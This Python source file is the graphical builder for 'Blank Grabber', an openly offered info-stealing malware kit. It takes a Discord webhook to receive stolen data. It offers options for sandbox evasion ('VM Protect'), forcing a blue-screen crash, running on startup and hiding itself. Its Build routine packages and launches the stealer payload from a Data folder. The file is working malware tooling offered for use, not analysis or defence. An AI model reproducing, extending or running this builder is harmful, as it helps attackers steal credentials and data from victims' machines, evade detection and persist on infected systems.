import tkinter as tk
from tkinter import ttk, messagebox
from urllib.request import urlopen, Request
from socket import create_connection
import json, os, subprocess, shutil, webbrowser, time, ctypes

def ToggleConsole(choice): # I am not using .pyw extention because of some reason
	if choice:
		# Show Console
		ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 4)
	else:
		# Hide Console
		ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

class Builder:
	def __init__(self):
		self.root = tk.Tk()
		self.PingME = tk.BooleanVar(self.root, True)
		self.VMprotect = tk.BooleanVar(self.root, True)
		self.BSOD = tk.BooleanVar(self.root, True)
		self.Startup = tk.BooleanVar(self.root, True)
		self.Hide = tk.BooleanVar(self.root, True)
		self.__main__()

	def __main__(self):
		self.root.title("Blank Grabber Builder")
		self.root.geometry("800x365")
		self.root.resizable(False, False)
		self.root['background'] = "black"
		self.root.bind("<Enter>", lambda event: self.WindowOpacity(event, 1))
		self.root.bind("<Leave>", lambda event: self.WindowOpacity(event, 0))
		self.root.bind("<Button-1>", lambda event: self.removeFocus(event))

		ttk.Label(text= "Blank Grabber", font= ("Franklin Gothic", 18, "bold"), foreground= "white", background= "black").place(relx= 0.5, anchor= "n")
		webhookEntry = ttk.Entry(self.root, foreground= "grey", background= "#303841")
		webhookEntry.insert(0, "Enter Webhook Here")
		webhookEntry.bind("<ButtonRelease-1>", lambda event: self.webhookEntryHint(event))
		webhookEntry.bind("<FocusOut>", lambda event: self.webhookEntryHint(event))
		webhookEntry.bind("<FocusIn>", lambda event: self.webhookEntryHint(event))
		webhookEntry.place(x= 20, y= 60, height= 30, width= 750)
		testHook_button= tk.Button(self.root, text= "Test Webhook", command= lambda: self.testHook(webhookEntry.get()), background= "#303841", foreground= "white", activebackground= "#303841", activeforeground= "white", font= ("Franklin Gothic", 10), width= 15)
		testHook_button.place(x = 770, anchor= "e", y= 110)
		PingME = tk.Checkbutton(self.root, text= "Ping Me", background= "black", foreground= "white", activebackground= "black", activeforeground= "white", selectcolor= "black", font= ("Franklin Gothic", 11), variable= self.PingME)
		BSOD = tk.Checkbutton(self.root, text= "BSOD", background= "black", foreground= "white", activebackground= "black", activeforeground= "white", selectcolor= "black", font= ("Franklin Gothic", 11), variable= self.BSOD)
		VMprotect = tk.Checkbutton(self.root, text= "VM Protect", background= "black", foreground= "white", activebackground= "black", activeforeground= "white", selectcolor= "black", font= ("Franklin Gothic", 11), variable= self.VMprotect, command= lambda: self.ToggleBsod(BSOD))
		Startup = tk.Checkbutton(self.root, text= "Run On Startup", background= "black", foreground= "white", activebackground= "black", activeforeground= "white", selectcolor= "black", font= ("Franklin Gothic", 11), variable= self.Startup)
		Hide = tk.Checkbutton(self.root, text= "Hide Itself", background= "black", foreground= "white", activebackground= "black", activeforeground= "white", selectcolor= "black", font= ("Franklin Gothic", 11), variable= self.Hide)

		PingME.place(y = 140, x= 20)
		VMprotect.place(y = 170, x= 20)
		BSOD.place(y= 200, x= 20)
		Startup.place(y= 230, x= 20)
		Hide.place(y= 260, x= 20)

		GithubButton = tk.Button(text= "Github", background= "#303841", foreground= "white", activebackground= "#303841", activeforeground= "white", width= "15", font= ("Franklin Gothic", 10, "bold"), command= lambda: webbrowser.open("https://github.com/Blank-c/Blank-Grabber", new= 2))
		GithubButton.place(x= 770, y= 180, anchor= "e")

		BuildButton = tk.Button(text= "Build", background= "#303841", foreground= "white", activebackground= "#303841", activeforeground= "white", width= "15", font = ("Franklin Gothic", 10, "bold"), command= lambda: self.Build(webhookEntry.get()))
		BuildButton.place(y= 260, x= 770, anchor= "e")

		self.root.mainloop()

	def Build(self, hook):
		def exit(exitcode= 0):
			os.system("pause > NUL")
			os._exit(exitcode)

		def clear():
			os.system("cls")

		def format1(title, description= ""):
			return f"[{title}\u001b[0m] \u001b[37;1m{description}\u001b[0m"

		def checkmodules():
			code = subprocess.run("virtualenv --version", capture_output= True, shell= True).returncode
			if code != 0:
				clear()
				print(format1("\u001b[33;1mInstalling virtualenv...") + "\n")
				os.system("pip install --quiet --upgrade virtualenv")
				code = subprocess.run("virtualenv --version", capture_output= True, shell= True).returncode
				if code != 0:
					print(format("\u001b[31;1mERROR", "A fatal issue is there with your python installation. Unable to access virtualenv. Try to reinstall Python to fix this issue."))
					exit(1)

		if not hook.startswith(("http://discord.com/api/webhooks/", "https://discord.com/api/webhooks/")):
			messagebox.showerror("Invalid Webhook", "The discord webhook you entered is invalid!")
			return
		if not self.checkInternetConnection():
			messagebox.showerror("Error", "Unable to connect to the internet!")
			return

		self.root.destroy()
		ToggleConsole(True)
		clear()
		print(format1("\u001b[33;1mINFO", "Checking modules..."))
		checkmodules()
		clear()

		if not os.path.isfile(os.path.join("env", "Scripts", "run.bat")):
			if not os.path.isdir(os.path.join(os.path.dirname(__file__), "env", "Scripts")):
				print(format1("\u001b[33;1mINFO", "Creating virtualenv... (might take some time)"))
				subprocess.run("virtualenv env", capture_output= True, shell= True)
				clear()
			print(format1("\u001b[33;1mINFO", "Copying assets to virtualenv"))
			for i in os.listdir(datadir := os.path.join(os.path.dirname(__file__), "Data")):
				if os.path.isfile(fileloc := os.path.join(datadir, i)):
					shutil.copyfile(fileloc, os.path.join(os.path.dirname(__file__), "env", "Scripts", i))
				else:
					shutil.copytree(fileloc, os.path.join(os.path.dirname(__file__), "env", "Scripts", i))
			with open(os.path.join(os.path.dirname(__file__), "env", "Scripts", "config.json"), "w", encoding= "utf-8", errors= "ignore") as file:
				configuration = {
					"PINGME" : self.PingME.get(),
					"VMprotect" : self.VMprotect.get(),
					"BSOD" : self.BSOD.get(),
    				"STARTUP" : self.Startup.get(),
    				"HIDE_ITSELF" : self.Hide.get()
				}
				json.dump(configuration, file, indent= 4)
			clear()
		with open(os.path.join("env", "Scripts", "webhook.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
			file.write(hook)
		os.chdir(os.path.join(os.path.dirname(__file__), "env", "Scripts"))
		print("\u001b[0m", end= "", flush= True)
		os.startfile("run.bat")

	def checkInternetConnection(self):
		try:
			create_connection(("1.1.1.1", 53))
			return True
		except OSError:
			return False

	def ToggleBsod(self, BSOD):
		if not self.VMprotect.get():
			BSOD["state"] = "disabled"
			self.BSOD.set(False)
		else:
			BSOD["state"] = "normal"
			self.BSOD.set(True)

	def removeFocus(self, event):
		if not isinstance(event.widget, ttk.Entry):
			self.root.focus()

	def testHook(self, hook):
		if not hook.startswith(("http://discord.com/api/webhooks/", "https://discord.com/api/webhooks/")):
			messagebox.showerror("Invalid Webhook", "The discord webhook you entered is invalid!")
			return
		if not self.checkInternetConnection():
			messagebox.showerror("Error", "Unable to connect to the internet!")
			return
		data = json.dumps({"content" : "Your webhook is working!"})
		req = Request(url= hook, data= data.encode(), method= "POST", headers= {"Content-Type" : "application/json", "user-agent" : "Mozilla/5.0 (Linux; Android 10; SM-T510 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Safari/537.36"})
		try:
			if (status := urlopen(req).status) == 204:
				messagebox.showinfo("Working", "Your webhook is working!")
			else:
				raise Exception()
		except Exception:
			messagebox.showwarning("Warning", "It looks like your webhook is not working!")

	def WindowOpacity(self, event, mode):
		if not isinstance(event.widget, tk.Tk):
			return
		if mode:
			self.root.attributes("-alpha", 1.0)
		else:
			self.root.attributes("-alpha", 0.7)

	def webhookEntryHint(self, event):
		choice = int(event.type)
		if choice in (5, 9):
			if str(event.widget["foreground"]) == "grey":
				event.widget["foreground"] = "black"
				event.widget.delete(0, "end")
		elif choice == 10:
			if str(event.widget["foreground"]) == "black" and not len(event.widget.get()):
				event.widget["foreground"] = "grey"
				event.widget.insert(0, "Enter Webhook Here")

if __name__ == "__main__":
	if os.name == "nt":
		if not os.path.isdir(os.path.join(os.path.dirname(__file__), "Data")):
			subprocess.run(f'mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'Data folder cannot be found!\', 10, \'Error\', 64);close()"', capture_output= True, shell= True)
			os._exit(1)
		ToggleConsole(False)
		Builder()